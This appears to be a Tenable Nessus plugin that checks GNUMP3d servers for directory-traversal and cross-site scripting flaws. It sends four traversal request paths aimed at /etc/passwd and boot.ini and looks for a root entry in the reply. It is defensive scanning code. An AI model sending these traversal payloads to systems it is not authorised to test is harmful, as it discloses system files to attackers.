#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(20110);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-3123", "CVE-2005-3424", "CVE-2005-3425");
  script_bugtraq_id(15226, 15228, 15341);
  script_xref(name:"OSVDB", value:"20359");
  script_xref(name:"OSVDB", value:"20360");
  script_xref(name:"OSVDB", value:"20723");

  script_name(english:"GNUMP3d < 2.9.6 Multiple Remote Vulnerabilities (XSS, Traversal)");
  script_summary(english:"Checks for multiple vulnerabilities in GNUMP3d < 2.9.6");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote streaming server is prone to directory traversal and cross-
site scripting attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running GNUMP3d, an open-source audio / video
streaming server. 

The installed version of GNUMP3d on the remote host suffers fails to
completely filter out directory traversal sequences from request URIs. 
By leveraging this flaw, an attacker can read arbitrary files on the
remote subject to the privileges under which the server operates.  In
addition, it fails to sanitize user-supplied input to several scripts,
which can be used to launch cross-site scripting attacks against the
affected application." );
 script_set_attribute(attribute:"see_also", value:"http://savannah.gnu.org/cgi-bin/viewcvs/gnump3d/gnump3d/ChangeLog?rev=1.134&content-type=text/vnd.viewcvs-markup" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to GNUMP3d 2.9.7 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 3333, 8888);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:8888);


# Unless we're paranoid, make sure the banner looks like GNUMP3d.
if (report_paranoia < 2) {
  banner = get_http_banner(port:port);
  if (!banner || "Server: GNUMP3d " >!< banner) exit(0);
}


# Try to exploit the directory traversal flaw.
exploits = make_list(
  # should work up to 2.9.5 under Windows.
  "/..\..\..\..\..\..\..\..\..\boot.ini",
  # works in 2.9.3 under *nix.
  "/.//././/././/././/././/././/././/./etc/passwd",
  # should work in 2.9.1 - 2.9.2 under *nix, although apparently only if gnump3d's root directory is one level down from the root (eg, "/mp3s").
  "/....///....///....///....///....///....//....//....//etc/passwd",
  # should work w/ really old versions under *nix.
  urlencode(str:"/../../../../../../../etc/passwd")
);
foreach exploit (exploits) {
  r = http_send_recv3(method:"GET",item:exploit, port:port);
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);
  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
    if (report_verbosity > 0)
      security_warning(port:port, extra: res);
    else
      security_warning(port:port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
